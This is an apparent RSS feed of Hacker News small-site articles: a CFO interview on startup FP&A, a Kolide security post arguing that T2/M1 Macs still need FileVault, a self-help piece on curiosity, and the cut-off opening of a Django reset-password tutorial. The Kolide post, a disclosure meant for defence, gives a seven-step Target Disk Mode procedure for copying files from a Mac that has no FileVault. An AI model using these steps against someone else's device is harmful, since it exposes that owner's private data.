December 29, 2020 | https://boringstartupstuff.com/newsletter/dec-29th-2020-become-a-financial-quarterback | <a href="https://web.archive.org/web/*/https://boringstartupstuff.com/newsletter/dec-29th-2020-become-a-financial-quarterback">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em><span>As the CFO of </span><a href="https://yipitdata.com/"><span>YipitData</span></a><span>, Eric Lesser has to have a quarterback-like vision on his company's</span></em><em><span> financial health.&nbsp;</span></em></p>
<p><em><span>Eric manages the finance and accounting teams to help the company financially strategize for all ongoing and new initiatives. His work cuts across the organization's different teams and is the linchpin to maintaining Yipit’s explosive growth.&nbsp;</span></em></p>
<p><em><span>Prior to joining YipitData, Eric was the VP of FP&amp;A and Corporate Development at Payoneer. There he helped lead </span><a href="https://techcrunch.com/2016/10/05/payoneer-raises-180-million-for-its-global-payments-technology/"><span>several venture</span></a><span> </span><a href="https://www.businesswire.com/news/home/20140305005995/en/Payoneer-Secures-25-Million-Funding-Led-Investor"><span>rounds</span></a><span> as part of the internal Corporate Development team. Having joined Payoneer in mid-2012, Eric watched the company transform from a relatively successful early stage venture to a global player in the payments space.</span></em></p>

<h5><b>Give me the FP&amp;A 101 for startups - What does it mean? What are the work products of someone in FP&amp;A? What are some different calculations or metrics typically used?</b></h5>
<p><span>FP&amp;A’s main goal is to provide insights to help business managers make informed decisions.</span></p>
<p><span>What does this mean in practice? While each FP&amp;A team will have different responsibilities, there are more standard FP&amp;A work products, and ad-hoc analysis that will depend on the company and change as the company scales.</span></p>
<p><span>Some of the more standard work products can include forecast models, budgets, board reporting, unit economics and KPI monitoring, and other ad-hoc analysis.&nbsp;</span></p>
<p><span>To dive a little deeper into a standard work product, FP&amp;A is typically responsible for creating a multi-year forecast for the company.&nbsp; In order to do this the FP&amp;A team needs to understand the drivers of the business’s revenue and determine what revenue can realistically look like a few years out and the resources needed to get there.&nbsp;</span></p>
<p><span>As an example, FP&amp;A might first look at the business and come up with a reasonable assumption of how much it will grow based on historical trends.&nbsp; From there maybe you layer on how much new sales the business will do based on the productivity of the sales team.&nbsp; If you want to grow, you might add more salespeople, but then FP&amp;A will need to understand how those new people increase costs – for example, you might need more office space, or maybe you need more people in HR to recruit them, etc.</span></p>
<p><span>So, it’s really about seeing the entire picture and coming up with a coherent logical story for what the future might look like.</span></p>

<p><b>When should startups begin thinking about implementing an FP&amp;A process? What initial steps do you recommend a growing startup take to make sure they stay financially healthy?</b></p>
<p><span>Businesses would benefit from having a more structured FP&amp;A process once they are in a stage where they need to allocate financial resources and prioritize among different investment decisions.&nbsp;</span></p>
<blockquote>
<p><span>When a startup is early, and just trying to build and market a single product, it’s a bit simpler; you need to budget your cash, of course, but you aren’t deciding between multiple competing different investment opportunities that you need to evaluate separately.&nbsp; Then you might reach a phase where you are growing super quickly and don’t really have time or a need to think about FP&amp;A.&nbsp;</span></p>
</blockquote>
<p><span>But once you are in a place where you could either invest in sales, product team or marketing it becomes worthwhile to add some more structure since you will need to figure out which is the best investment and what you can afford. At its best, FP&amp;A helps the business understand the trade-offs of investing in one area versus another. On top of that, FP&amp;A will be able to show you, with some reasonable accuracy, how much revenue the business will be needed to pay for those investments. Then, as a result, how much cash will be generated or, more likely for a startup, how much additional cash you will need to support the business.</span></p>

<p><b>Modeling can be a bit of an art - what factors go into your modeling process at Yipit?&nbsp;</b></p>
<p><span>I definitely agree with that statement.&nbsp; We are certainly doing a lot of analysis for our models and are being as scientific as possible, but at the end of the day when modeling you are basically trying to predict the future and there are a lot of unknowns.&nbsp;</span></p>
<p><span>At YipitData and at Payoneer, our modeling process was somewhat similar in the sense that we differentiated between our existing products versus new opportunities. The existing business is much more predictable; we take a few different approaches but one way that we have seen some success in the past is by looking at the trends on a cohort basis and using that as a way to determine what the next few years might look like.&nbsp;</span></p>
<p><span>For example, we might look at products we launched in 2018 and see how those products scaled up in 2019 and 2020 and compare that to 2019 new products launched and the performance in 2020.&nbsp; From there you can potentially identify some patterns that will help you determine what a realistic number in the future might be depending on a range of factors.</span></p>

<p><b>How is this different for new products vs existing products?</b></p>
<p><span>For new products, you don’t have these historical trends to analyze, and that’s when it can become much more of an art.&nbsp; So there are a few different approaches here: you might try to figure out a similar product that was launched before and expect a similar result, or you might do more of a top-down market sizing analysis where you estimate how big the potential is and come up with a reasonable number for how many customers you can acquire over time.</span></p>
<p><span>For both existing and especially new products analysis is the key to putting a strong model together, but at the same time an effective FP&amp;A team really needs to understand all aspects of the business.&nbsp; So, you’d want to work with product and sales teams to understand if the assumptions you are using are reasonable, and if not, why not.</span></p>
<p><span>And once you have the model built, it’s really important to track actual results versus expectations so that you can learn about how to adjust in the future.</span></p>

<p><b>Who are the stakeholders when it comes to FP&amp;A at Yipit? As CFO, what is your process for dealing with everyone and making sure everyone is aligned?</b></p>
<p><span>The FP&amp;A team is really only as good as the inputs we are getting from other parts of the business.&nbsp; The reason for this is that the numbers and financial analysis are very important, but numbers will only tell you part of the story when trying to understand prior performance and what it means for the future.&nbsp;</span></p>
<blockquote>
<p><span>In order for FP&amp;A to be effective, you really need to understand the business, which comes from building relationships with others outside of finance. That should really include all departments, such as sales, marketing, product/technology, operations, HR, etc.</span></p>
</blockquote>
<p><span>The tricky thing here is that managers of these departments are usually very busy running their respective areas of the business, and it’s a meeting with FP&amp;A can be seen as unnecessary bureaucracy that slows things down.&nbsp;</span></p>
<p><span>In order to combat this, I’ve found it’s really useful to not only use these meetings as a way for FP&amp;A better understand their areas of the business but also to demonstrate the value of what FP&amp;A can bring.</span></p>
<p><span>A few ways to do this include proactively sharing analysis that can be insightful and interesting to them, explaining why the information is needed and how we are positioning the company to the Board, and finally and most importantly really positioning the FP&amp;A/manager relationship as a partnership that will help us justify investment in whatever they want to achieve.&nbsp;</span></p>
<p><span>This doesn’t happen on Day 1 and takes time, but it can be tremendously helpful in getting the alignment needed.&nbsp; It requires an FP&amp;A team that is not only good at number crunching but at explaining numbers on a high level to people who are not used to seeing them every day.</span></p>

<p><b>What other types of finance or accounting processes are in place for a team the size of Yipit (team wide, individual) and what is the cadence of reviewing these?&nbsp;&nbsp;</b></p>
<p><span>We will end the year with just over 170 employees, up from 115 earlier this year.&nbsp; We’ve been fortunate to grow despite the difficult circumstances that everyone faced this year with COVID-19.</span></p>
<p><span>Some of our major processes include:</span></p>
<ul>
<li><span></span><span> </span><span>Budget – this kicks off in September and finishes toward the end of the year.&nbsp; It involves first getting a sense internally of where the business is likely to end up from a revenue / cash flow point of view, and then deep discussions with each manager to determine what are some of the new initiatives we will want to focus on in the next year and projecting how much they will cost and the potential return on investment.</span></li>
</ul>
<ul>
<li><span></span><span> </span><span>Budget versus actual analysis – the next step once the budget is approved is to share a file with each manager on a monthly basis to demonstrate what their expenses were versus the budget. This gives them clear insight into how things are tracking.&nbsp; I tell the managers that while we do want to monitor expenses, the best thing that could happen is if we find some sort of investment that is working really well, and we want to increase the budget for that expense. This is a great opportunity for us to better understand what is happening in each department and what they are focused on and why.</span>&nbsp;</li>
</ul>
<ul>
<li><span></span><span> </span><span>Board of Directors presentation – our Board of Directors has monthly calls and quarterly meetings, for which the FP&amp;A team is responsible for putting together analysis charts and KPIs to demonstrate how the business is doing relative to expectations and why.</span></li>
</ul>
<ul>
<li><span></span><span> </span><span>Monthly financial close – we report our financials on a monthly basis and each month kicks off a 10 day in depth process to close our books and report accurately</span></li>
</ul>
<ul>
<li><span></span><span> </span><span>Monthly meetings with teams – The FP&amp;A team meets with other teams outside of the budget process on a monthly basis to both share analysis and learn about what is happening in other areas of the business.&nbsp; The more we can understand the business the better we are able to analyze and forecast</span></li>
</ul>
<ul>
<li><span></span><span> </span><span>Distribution of a KPI dashboard – this is a process we are just starting now on a monthly basis but at Payoneer it was more frequent.&nbsp;&nbsp;&nbsp;</span></li>
</ul>

<p><b>What tools does your team use? How do you anticipate your toolset …</b></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://boringstartupstuff.com/newsletter/dec-29th-2020-become-a-financial-quarterback">https://boringstartupstuff.com/newsletter/dec-29th-2020-become-a-financial-quarterback</a></em></p>]]>
            </description>
            <link>https://boringstartupstuff.com/newsletter/dec-29th-2020-become-a-financial-quarterback</link>
            <guid isPermaLink="false">hacker-news-small-sites-25570921</guid>
            <pubDate>Tue, 29 Dec 2020 15:52:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[M1 Macs SSD “Encryption” trivially bypassed unless FileVault is enabled]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 23 (<a href="https://news.ycombinator.com/item?id=25570876">thread link</a>) | @terracatta
<br/>
December 29, 2020 | https://blog.kolide.com/modern-macs-still-need-filevault-d5e2f55c083b | <a href="https://web.archive.org/web/*/https://blog.kolide.com/modern-macs-still-need-filevault-d5e2f55c083b">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><h2 id="b46e">Built-in Mac SSD Encryption Is Easily Bypassed by an Attacker With Physical Access if Filevault Isn’t Enabled</h2><div><div><div><p><a href="https://medium.com/@fritz_?source=post_page-----d5e2f55c083b--------------------------------" rel="noopener"><img alt="Fritz Ifert-Miller" src="https://miro.medium.com/fit/c/96/96/0*m1fK8ctg-lpc-4R5." width="48" height="48"></a></p></div></div></div><p id="0760">If you buy a modern Mac in 2020, it is going to come with a special physical component called the Secure Enclave. This component enables Apple to carry over many popular iOS features which require extra hardware security like Touch ID and Apple Pay to the Mac.</p><p id="4f7b">One of the lesser-known features of the Secure Enclave is that it performs automatic hardware based encryption of a Mac’s built-in SSD. This means that without any user intervention, your new Mac is encrypted right out of the packaging. With this fact in mind, you may be wondering if taking the extra step of enabling FileVault is still necessary? I am here to tell you, <strong>yes, it is absolutely </strong>necessary<strong>.</strong></p><p id="c7b9">An encrypted Mac without FileVault allows anyone who has physical access to your device to trivially read your personal data. They don’t even need to know your password. Even worse, some tools used to detect FileVault’s status (like <a href="http://osquery.io/" rel="noopener">osquery</a>), can conflate the differences between <strong>Encrypted</strong> versus <strong>FileVault On</strong> causing you to believe the data on your Mac is safe, when in fact, it’s unprotected from the most common scenarios wherein we rely on encryption to save us.</p><p id="6c62">In this article we will review the current situation, the steps you should take to ensure you are correctly polling this information, and how we are patching osquery to resolve this confusion.</p><ul><li id="5e11">The osquery <code>disk_encryption</code> table as of December 20th, 2020, reports a value of <code>encrypted = 1</code> for <strong>all T2 and M1 Macs</strong>, <em>regardless of the FileVault status</em>. This information is technically correct, but has likely resulted in inaccurate interpretations about FileVault’s status.</li><li id="138f">Kolide determined that the SSD of Encrypted Macs without FileVault can be trivially accessed with simple physical access to the device.</li><li id="df8d">Kolide <a href="https://github.com/kolide/launcher/pull/686" rel="noopener">shipped a hotfix for its own customers</a> with a new launcher table <code>kolide_filevault_status</code>, and amended its Check to address the issue.</li><li id="ce2e">Kolide <a href="https://github.com/osquery/osquery/pull/6823" rel="noopener">shipped a patch for the osquery</a> <code>disk_encryption</code> table to include a new column: <code>filevault_status</code></li></ul><p id="0577">For 30 years, Apple has included a tool with its operating systems called ‘Target Disk Mode’. This utility allowed a user to mount the disk of one Apple device, on another device as a network volume. There are a variety of reasons this functionality is helpful, the most common being, the retrieval of data on a Mac that no longer boots successfully.</p></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/7944/1*Wj0OSxfGZSjBylDsV7W3tA.png" width="3972" height="2130" srcset="https://miro.medium.com/max/552/1*Wj0OSxfGZSjBylDsV7W3tA.png 276w, https://miro.medium.com/max/1104/1*Wj0OSxfGZSjBylDsV7W3tA.png 552w, https://miro.medium.com/max/1280/1*Wj0OSxfGZSjBylDsV7W3tA.png 640w, https://miro.medium.com/max/1456/1*Wj0OSxfGZSjBylDsV7W3tA.png 728w, https://miro.medium.com/max/1632/1*Wj0OSxfGZSjBylDsV7W3tA.png 816w, https://miro.medium.com/max/1808/1*Wj0OSxfGZSjBylDsV7W3tA.png 904w, https://miro.medium.com/max/1984/1*Wj0OSxfGZSjBylDsV7W3tA.png 992w, https://miro.medium.com/max/2000/1*Wj0OSxfGZSjBylDsV7W3tA.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*Wj0OSxfGZSjBylDsV7W3tA.png?q=20"></p></div></div></div><figcaption>Apple’s built in Target Disk Mode makes it stupid easy to dump the entire contents of an “encrypted” Mac that doesn’t have FileVault enabled</figcaption></figure></div></div></div><div><div><p id="8058">However, using macOS’s Target Disk Mode an attacker with physical access to a device can trivially access the contents of the disk by physically connecting it to another computer and booting it in Recovery Mode. So while that disk may <em>‘Actually’</em> be Encrypted at Rest thanks to the Secure Enclave, it is completely vulnerable to data exfiltration so long as FileVault has not been configured.</p><p id="cf96">How easy is this you might wonder? In our testing you can start pulling down a target device’s files in less than 3 minutes:</p><ol><li id="9189">Shut down and Boot the target device into Recovery Mode (either by holding <strong>⌘</strong>+R or on M1 Macs by holding the Power button)</li><li id="f30f">Once in Recovery Mode (On M1 Macs): Click <strong>Options</strong></li><li id="7be3">Under the <strong>Utilities</strong> dropdown, select <strong>Share Disk</strong></li><li id="fb30">Connect your target device to the recipient device using a Thunderbolt 3 USB-C cable</li><li id="958b">Select your internal hard disk and click <strong>Start Sharing</strong></li><li id="7c0f">In Finder on your recipient device, click MacBook Pro under Locations &gt; Network</li><li id="8883">Copy any desired target files.</li></ol></div></div><div><figure><div role="button" tabindex="0"><div><p><img alt="Image for post" src="https://miro.medium.com/max/17472/1*3x1n9ncea8MM7tCNpDNm-Q.png" width="8736" height="1800" srcset="https://miro.medium.com/max/552/1*3x1n9ncea8MM7tCNpDNm-Q.png 276w, https://miro.medium.com/max/1104/1*3x1n9ncea8MM7tCNpDNm-Q.png 552w, https://miro.medium.com/max/1280/1*3x1n9ncea8MM7tCNpDNm-Q.png 640w, https://miro.medium.com/max/1456/1*3x1n9ncea8MM7tCNpDNm-Q.png 728w, https://miro.medium.com/max/1632/1*3x1n9ncea8MM7tCNpDNm-Q.png 816w, https://miro.medium.com/max/1808/1*3x1n9ncea8MM7tCNpDNm-Q.png 904w, https://miro.medium.com/max/1984/1*3x1n9ncea8MM7tCNpDNm-Q.png 992w, https://miro.medium.com/max/2160/1*3x1n9ncea8MM7tCNpDNm-Q.png 1080w, https://miro.medium.com/max/2700/1*3x1n9ncea8MM7tCNpDNm-Q.png 1350w, https://miro.medium.com/max/3240/1*3x1n9ncea8MM7tCNpDNm-Q.png 1620w, https://miro.medium.com/max/3780/1*3x1n9ncea8MM7tCNpDNm-Q.png 1890w, https://miro.medium.com/max/4320/1*3x1n9ncea8MM7tCNpDNm-Q.png 2160w, https://miro.medium.com/max/4800/1*3x1n9ncea8MM7tCNpDNm-Q.png 2400w" sizes="100vw" data-old-src="https://miro.medium.com/max/60/1*3x1n9ncea8MM7tCNpDNm-Q.png?q=20"></p></div></div><figcaption>Recovery Mode on Target Device</figcaption></figure></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/8640/1*aDaV6pcNG06lVl85Dpe4XQ.png" width="4320" height="1308" srcset="https://miro.medium.com/max/552/1*aDaV6pcNG06lVl85Dpe4XQ.png 276w, https://miro.medium.com/max/1104/1*aDaV6pcNG06lVl85Dpe4XQ.png 552w, https://miro.medium.com/max/1280/1*aDaV6pcNG06lVl85Dpe4XQ.png 640w, https://miro.medium.com/max/1456/1*aDaV6pcNG06lVl85Dpe4XQ.png 728w, https://miro.medium.com/max/1632/1*aDaV6pcNG06lVl85Dpe4XQ.png 816w, https://miro.medium.com/max/1808/1*aDaV6pcNG06lVl85Dpe4XQ.png 904w, https://miro.medium.com/max/1984/1*aDaV6pcNG06lVl85Dpe4XQ.png 992w, https://miro.medium.com/max/2000/1*aDaV6pcNG06lVl85Dpe4XQ.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*aDaV6pcNG06lVl85Dpe4XQ.png?q=20"></p></div></div></div><figcaption>Accessing Networked Target Disk on Recipient Device</figcaption></figure></div></div></div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2130/0*wuXZO932LT8m43_I" width="1065" height="590" srcset="https://miro.medium.com/max/552/0*wuXZO932LT8m43_I 276w, https://miro.medium.com/max/1104/0*wuXZO932LT8m43_I 552w, https://miro.medium.com/max/1280/0*wuXZO932LT8m43_I 640w, https://miro.medium.com/max/1400/0*wuXZO932LT8m43_I 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*wuXZO932LT8m43_I?q=20"></p></div></div></div></figure><p id="a9ce">In 2018, Apple introduced a slate of Macs with a new security co-processor called <strong>T2</strong>. With this new Secure Enclave CPU, Apple moved from a pattern of software encryption (FileVault2) to automatic hardware encryption. In 2020, on the newly introduced Apple Silicon Macs, a similar Secure Enclave is built right into the M1 SoC.</p><p id="24db">Both the T2 and the M1 Secure Enclave securely store a 256-bit AES key (UID) which cannot be directly accessed and is burnt into the chip, protecting both the SSD’s data and the TouchID sensor’s stored fingerprints, as well as disabling the device’s camera and microphone when the computer is locked.</p><p id="fe41">What this means in practice, is that the data on a Mac’s disk cannot be accessed once the disk is physically separated from the Mac or if the underlying encryption key is lost. In fact, if your Secure Enclave is damaged or wiped, this encryption will prevent you from accessing any of the contents of the drive. This is yet another failure mode one must negate with backups (<a href="https://support.apple.com/en-ae/guide/mac-help/mh11421/11.0/mac/11.0" rel="noopener">which come with their own encryption considerations</a>)</p><p id="74e6">Before the introduction of the T2 security chip, disk encryption was synonymous with FileVault configuration on macOS. However, with hardware encryption this distinction became multi-faceted. This nuance was particularly problematic for security agents that did not differentiate between a disk that was ‘encrypted’ and a device that had FileVault configured.</p><p id="b412">Unfortunately, osquery fell into that camp, and its <code>disk_encryption</code> table simply returned a boolean value for the column <code>encrypted</code>, leading many to draw an erroneous conclusion causing a false sense of security.</p></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3200/0*1t7if31l-fcAGmX1" width="1600" height="1029" srcset="https://miro.medium.com/max/552/0*1t7if31l-fcAGmX1 276w, https://miro.medium.com/max/1104/0*1t7if31l-fcAGmX1 552w, https://miro.medium.com/max/1280/0*1t7if31l-fcAGmX1 640w, https://miro.medium.com/max/1456/0*1t7if31l-fcAGmX1 728w, https://miro.medium.com/max/1632/0*1t7if31l-fcAGmX1 816w, https://miro.medium.com/max/1808/0*1t7if31l-fcAGmX1 904w, https://miro.medium.com/max/1984/0*1t7if31l-fcAGmX1 992w, https://miro.medium.com/max/2000/0*1t7if31l-fcAGmX1 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/0*1t7if31l-fcAGmX1?q=20"></p></div></div></div><figcaption>Osquery conflates the differences between FileVault and Encryption in its `disk_encryption` virtual table leading to False Negatives</figcaption></figure></div></div></div><div><div><p id="8637">This issue was discovered when the output of common macOS terminal utilities (<code>diskutil apfs list</code> and <code>fdesetup status</code>) returned different information from what was observed when querying devices using osquery.</p><p id="c10b">This issue proved initially difficult to track down, due to the false-negative nature. It is often easier to track down a coding issue producing a false-positive but an intermittent false negative can be truly maddening. Because users are encouraged during setup to configure FileVault on new devices it is uncommon to see devices without it, this coupled with the fact that the table worked as expected on older hardware, led to a difficulty in establishing a pattern and subsequently a lag-time in discovery.</p><p id="1e06">Fortunately with some additional reverse engineering of Kolide <a href="https://github.com/kolide/launcher/pull/686" rel="noopener">updated its own agent</a> and <a href="https://github.com/osquery/osquery/pull/6823" rel="noopener">Osquery itself</a> to report this data accurately. At the time of this writing the Osquery core-team has not issued an official release containing this fix, but building the agent yourself should net the new column you need.</p><p id="d7e3">Since publishing this article, I have gotten some feedback suggesting I am making a mountain out of a molehill. The most common critique that I have encountered is:</p><blockquote><p id="5929">“Isn’t it basically impossible to setup a device without FileVault in 2020?”</p></blockquote></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3756/1*tcL0VdjLNnX2h18RWJSTPQ.png" width="1878" height="612" srcset="https://miro.medium.com/max/552/1*tcL0VdjLNnX2h18RWJSTPQ.png 276w, https://miro.medium.com/max/1104/1*tcL0VdjLNnX2h18RWJSTPQ.png 552w, https://miro.medium.com/max/1280/1*tcL0VdjLNnX2h18RWJSTPQ.png 640w, https://miro.medium.com/max/1456/1*tcL0VdjLNnX2h18RWJSTPQ.png 728w, https://miro.medium.com/max/1632/1*tcL0VdjLNnX2h18RWJSTPQ.png 816w, https://miro.medium.com/max/1808/1*tcL0VdjLNnX2h18RWJSTPQ.png 904w, https://miro.medium.com/max/1984/1*tcL0VdjLNnX2h18RWJSTPQ.png 992w, https://miro.medium.com/max/2000/1*tcL0VdjLNnX2h18RWJSTPQ.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*tcL0VdjLNnX2h18RWJSTPQ.png?q=20"></p></div></div></div></figure></div></div></div><div><div><p id="5fc3">While I would love for this to be the case, it is actually surprisingly easy to configure a device without Enabling FileVault.</p><p id="0170">I was similarly skeptical when I first encountered this situation; certainly only someone with intent and know-how could avoid FileVault.</p><p id="5443">To verify I wiped and then setup an M1 MacBook from a blank-slate. The step where FileVault would have been enabled was gated by connecting an AppleID. No mention of FileVault was made and no warning was given when the step was opted out:</p></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/12144/1*rQ50UpxIv2fuTz5xtiWjmw.png" width="6072" height="1800" srcset="https://miro.medium.com/max/552/1*rQ50UpxIv2fuTz5xtiWjmw.png 276w, https://miro.medium.com/max/1104/1*rQ50UpxIv2fuTz5xtiWjmw.png 552w, https://miro.medium.com/max/1280/1*rQ50UpxIv2fuTz5xtiWjmw.png 640w, https://miro.medium.com/max/1456/1*rQ50UpxIv2fuTz5xtiWjmw.png 728w, https://miro.medium.com/max/1632/1*rQ50UpxIv2fuTz5xtiWjmw.png 816w, https://miro.medium.com/max/1808/1*rQ50UpxIv2fuTz5xtiWjmw.png 904w, https://miro.medium.com/max/1984/1*rQ50UpxIv2fuTz5xtiWjmw.png 992w, https://miro.medium.com/max/2000/1*rQ50UpxIv2fuTz5xtiWjmw.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*rQ50UpxIv2fuTz5xtiWjmw.png?q=20"></p></div></div></div></figure></div></div></div></section></div></div>]]>
            </description>
            <link>https://blog.kolide.com/modern-macs-still-need-filevault-d5e2f55c083b</link>
            <guid isPermaLink="false">hacker-news-small-sites-25570876</guid>
            <pubDate>Tue, 29 Dec 2020 15:49:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to develop your curiosity for a better self?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25570806">thread link</a>) | @saranshk
<br/>
December 29, 2020 | https://www.wisdomgeek.com/self-help/life-tips/how-to-develop-your-curiosity-for-a-better-self/ | <a href="https://web.archive.org/web/*/https://www.wisdomgeek.com/self-help/life-tips/how-to-develop-your-curiosity-for-a-better-self/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-td-block-uid="tdi_70_fbb"><div><p>Curiosity is the reason why most of the breakthrough discoveries and remarkable inventions have happened throughout history. In the absence of curiosity, there would not have been an impulse to seek new information or experiences. Exploring possibilities is what defines human nature and thus curiosity is an integral part of us. But as we grow older, we become more passive and start limiting ourselves to newer ideas. Thus, we need to cultivate a process and this post talks about how to develop curiosity and make the most out of it.</p><h2>Benefits of curiosity</h2><p>Before diving into the steps for how to develop curiosity, let us first look at why we need curiosity in the first place. The benefits include:</p><ul><li><strong>Innovation:</strong> An active mind is always looking for answers and brings newer ideas to the table</li><li><strong>Fewer decision-making errors:</strong> Since a curious person has done some research, they are likely to make lesser errors, and are also less likely to fall prey to confirmation bias.</li><li><strong>More communication among teams:</strong> Curious people tend to discuss a lot. This increases the performance of teams since there are more open discussions and people listen carefully to one another. It can also lead to reduced group conflicts.</li></ul><h2>How to develop curiosity?</h2><p><span>- Advertisement -</span> <ins data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-1198872678846288" data-ad-slot="2989761355"></ins> </p><p>Now that we understand the benefits of curiosity, let’s look at steps that you can take to develop it.</p><h2>1. Keep an open mind</h2><p>We often assume that we know how everything works and that we have seen it all. That attitude is the biggest killer of curiosity and is the first step in developing curiosity. Pretending that we are children and not associating past experiences can help in grasping a better understanding of things.</p><p>We should not rely on assumptions and be prepared to learn, unlearn, and relearn.</p><p>We should also be prepared to accept the possibility that the things that we already know might be incorrect. Trying to look at things without as much bias as possible helps improve our decision-making capabilities. Bias also leads us to categorizing things as “boring” which is a curiosity killer.</p><h2>2. Question everything relentlessly</h2><p>Life is full of questions that we do not know the answers to. Notice things and asking questions around them and their existence brings in an element of fascination and inquisition. Instead of taking things for granted, we should dig deeper to have a better idea of what is beneath the surface.</p><p>The best questions are open-ended ones. Try and ask more of “Why?”, “What if…?” and “How might we…?” questions. Also, be willing to ask dumb questions. Most of the time we assume that the question is dumb, even though it might not be. And even if ends up being one, it can still lead to an interesting conversation.</p><p>There is nothing wrong with not knowing everything. But not asking the question is probably a bad decision.</p><p>Do you know why the sky is blue? Why the water is wet? How is electricity transmitted? Why the earth is round? Why is the fire hot? What causes the seasonality around the year? Why is red the most eye-catching color? What if you could stop time whenever you wanted to? How might we get an answer to all these questions?</p><p>What can I learn from this? is a question that brings in a perspective that we might not have thought of otherwise. This is one question that can drastically increase our curiosity if we ask it of ourselves after doing something. It can also help prepare us for unexpected outcomes of an event.</p><h2>3. Diversify your interests</h2><p>We often romanticize curiosity in children and always use the phrase “They have not been tainted by life’s experiences yet”. But creativity is not cultivated in a void.</p><p>Successful innovators are usually ones who are able to amass vast amounts of knowledge, often in various fields. They are then able to draw on this knowledge unthinkably. Once they have that mastery, they focus on rewriting their domains, mixing and remixing thoughts, ideas, and themes. Since they have knowledge about different domains, they are able to easily make analogies and spot patterns leading to creative breakthroughs.</p><p>There are many names given to this process. Here’s Elon Musk explaining first principles:</p><figure><p> <iframe title="The First Principles Method Explained by Elon Musk" width="696" height="392" src="https://www.youtube.com/embed/NV3sBlRgzTI?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p></figure><p>We should therefore become experts who are interested in everything. It is good to be a master of a few things, but breadth is important too. To really ignite knowledge, we need to have the thought process of being able to reason from different perspectives and also being able to collaborate with people with different specializations.</p><p>If listening to music is your favorite hobby, try switching to reading a book. Go out and explore the world, from your neighborhood to a new city. Watch a documentary if you have never watched one, or maybe a foreign movie. New experiences help activate our minds in ways other things cannot. And active minds are the best answer to “how to develop curiosity?”</p><h2>4. Find solace in discomfort</h2><p>Trying something new can be scary. But we have to become comfortable in that discomfort in order to embrace curiosity. Staying in our comfort zone is easy. But it kills our curiosity and runs our creative juices dry. The more curious we become, the less afraid we are to try newer things. And the better understanding we have of things around us. If we are afraid of doing something, we should focus on its positive outcomes.</p><p>What are you waiting for? Go out and try something new, and ask questions around it, and be amazed by every day things! And leave a comment below about what you find.</p><p><em>“I have no special talent. I am only passionately curious.”</em> – Albert Einstein</p></div></div></div>]]>
            </description>
            <link>https://www.wisdomgeek.com/self-help/life-tips/how-to-develop-your-curiosity-for-a-better-self/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25570806</guid>
            <pubDate>Tue, 29 Dec 2020 15:44:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tutorial on Django Rest Framework Reset Password with Testing]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25570724">thread link</a>) | @pplonski86
<br/>
December 29, 2020 | https://saasitive.com/tutorial/django-rest-framework-reset-password/ | <a href="https://web.archive.org/web/*/https://saasitive.com/tutorial/django-rest-framework-reset-password/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>What to do when user forgot the password? We need to have a <strong>reset password view</strong>. User enters there her email address and email with reset link is sent. The reset link contains special information like <code>uid</code> and <code>token</code>. When user clicks the reset link, the <strong>reset password confirm view</strong> is displayed. This view takes the <code>uid</code> and <code>token</code> from the link and a new password and send <code>POST</code> request to the Django server to set a new password. In this post, we will create the reset password functionality with Django Rest Framework and Djoser package.</p>

<p>What will you learn in this post:</p>
<ul>
  <li>how does reset password work in the web service,</li>
  <li>how to send reset password email,</li>
  <li>how to set a new password with reset link,</li>
  <li>how to <strong>test</strong> the above functionality.</li>
</ul>

<p>The user interface and production email setup will be descibed in the next posts (in this post only backend code will be provided). Fill the <a href="https://forms.gle/rgAG9gkhUEH2wUVt5">form</a> to be notified about future posts.</p>

<p>This article is a part of articles series on <a href="https://saasitive.com/django-react/boilerplate/">how to build SaaS from scratch with Django and React</a>. I will use the code from the previous article: <a href="https://saasitive.com/tutorial/django-rest-framework-reset-password/">Django Rest Framework Email Verification</a>.</p>

<h2 id="reset-password-flow">Reset Password Flow</h2>

<p>In the backend there are two endpoints for reset password functionality. Both endpoints are provided by the <a href="https://djoser.readthedocs.io/">Djoser</a> package:</p>
<ul>
  <li><a href="https://djoser.readthedocs.io/en/latest/base_endpoints.html#reset-password">Reset Password</a> endpoint, that is available at <code>/users/reset_password/</code> URL. The enpoint requires the <code>email</code> field to send an email with reset password link. It has variable <code>PASSWORD_RESET_SHOW_EMAIL_NOT_FOUND</code> in the settings, by default set to <code>False</code>. It controls what type of error returns in the case of <code>email</code> address in the request which doesn’t exist in the database - by default it will return <code>HTTP_204_NO_CONTENT</code> and doesn’t send any email. If you want different behaviour, just change this variable.</li>
